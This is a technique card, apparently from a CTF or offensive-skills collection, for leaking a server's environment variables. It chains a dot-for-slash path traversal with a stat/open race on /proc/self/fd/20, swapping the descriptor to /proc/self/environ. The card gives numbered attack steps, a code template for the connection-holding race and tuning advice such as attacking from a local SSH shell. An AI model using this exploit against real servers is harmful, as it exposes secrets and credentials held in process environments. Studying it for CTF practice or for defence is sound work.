---
name: procfs_toctou_fd_swap_environ_leak
vuln_type: race_condition
sub_technique: procfs_fd_toctou
category: exploitation
safety_level: cautious
tags:
- path-traversal
- procfs
- toctou
- race
- environ
- fd-swap
---

# Path Traversal Empty Segment + /Proc/Self/Fd/N Toctou Race → Environ Flag Leak

## When to Apply

A router regex allows empty path segments (e.g. `..etc.passwd` via `..proc.self.fd.20`), enabling path traversal. The server does stat() then open() on /proc/self/fd/N, creating a TOCTOU window. By holding fd20 on a large file and swapping it to /proc/self/environ between stat and open, the environ bytes are leaked.

## Prerequisites

- Path traversal via empty regex segments in router
- Linux /proc filesystem accessible
- FLAG stored in environment variable
- Low-latency network access (local shell preferred for reliable race win)

## Steps

1. Open 5 connections holding /proc/self/fd/20 on a large file (e.g. /usr/local/bin/node).
2. Start target read: GET /query/view/..proc.self.fd.20
3. After brief random delay, close one holder.
4. Rapidly open 6 connections to /query/view/..proc.self.environ (reassigns fd 20).
5. Read target response — if environ hit, body starts with 'U','P','F' etc.
6. Extract FLAG from bytes: regex `FLAG=([^\x00]+)`.
7. Repeat up to 200k iterations (typical success within thousands).

## Code Template

```
R_BIG = rq('/query/view/..usr.local.bin.node')
R_ENV = rq('/query/view/..proc.self.environ')
R_TGT = rq('/query/view/..proc.self.fd.20')
holders = [connect(R_BIG) for _ in range(5)]
target = connect(R_TGT)
sleep(random(0.001, 0.0025))
holders[0].close()  # free fd slot
for _ in range(6): e = connect(R_ENV); sleep(random()); e.close()  # race swap
```

## Examples

### Example 1

- **traversal_pattern**: ..proc.self.fd.20 (dots replace /)
- **race_target**: /proc/self/fd/20
- **env_var**: FLAG

External network adds too much jitter. Running from the local shell port (SSH) dramatically increases success rate. The race window is between stat() and open() of the procfs fd symlink.
